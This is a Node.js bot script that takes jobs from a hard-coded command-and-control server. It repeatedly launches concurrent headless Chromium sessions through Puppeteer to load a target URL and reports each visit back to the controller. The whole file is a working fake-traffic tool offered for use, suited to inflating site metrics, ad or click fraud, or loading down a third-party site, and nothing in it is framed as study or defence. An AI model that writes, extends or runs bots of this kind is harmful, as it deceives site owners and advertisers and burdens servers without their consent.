const axios = require('axios');
const chromium = require('chromium');
const puppeteer = require('puppeteer-core');

const C_AND_C_SERVER_URL = 'https://traffic-generator-bot.onrender.com';

console.log("[*] Bot starting…");

async function getJobConfig() {
    try {
        const res = await axios.get(`${C_AND_C_SERVER_URL}/api/job`);
        return res.data;
    } catch (error) {
        console.error("[-] Could not fetch job from C&C:", error.message);
        return null;
    }
}

async function reportVisit(url) {
    try {
        await axios.post(`${C_AND_C_SERVER_URL}/api/report-visit`, { url });
        console.log(`[+] Visit reported for ${url}`);
    } catch (err) {
        console.error("[-] Failed to report visit:", err.message);
    }
}

async function startSingleVisit(targetUrl, duration) {
    try {
        const browser = await puppeteer.launch({
            executablePath: chromium.path,
            headless: true,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage'
            ]
        });

        const page = await browser.newPage();
        await page.goto(targetUrl, { timeout: 20000 });

        console.log(`[+] Visit started: ${targetUrl}`);

        await new Promise(res => setTimeout(res, duration));
        await browser.close();

        await reportVisit(targetUrl);
    } catch (err) {
        console.error("[-] Visit error:", err.message);
    }
}

async function runBot() {
    console.log("[*] Fetching initial job from C&C…");

    const job = await getJobConfig();
    if (!job) return console.log("[-] No job received. Exiting.");

    const { targetUrl, duration, interval, concurrency } = job;

    console.log("[*] Job received:", job);

    // Main loop
    while (true) {
        console.log(`[~] Starting ${concurrency} concurrent visits…`);

        const tasks = [];
        for (let i = 0; i < concurrency; i++) {
            tasks.push(startSingleVisit(targetUrl, duration));
        }

        await Promise.all(tasks);

        console.log(`[~] Waiting ${interval} ms before next batch…`);
        await new Promise(res => setTimeout(res, interval));
    }
}

runBot();
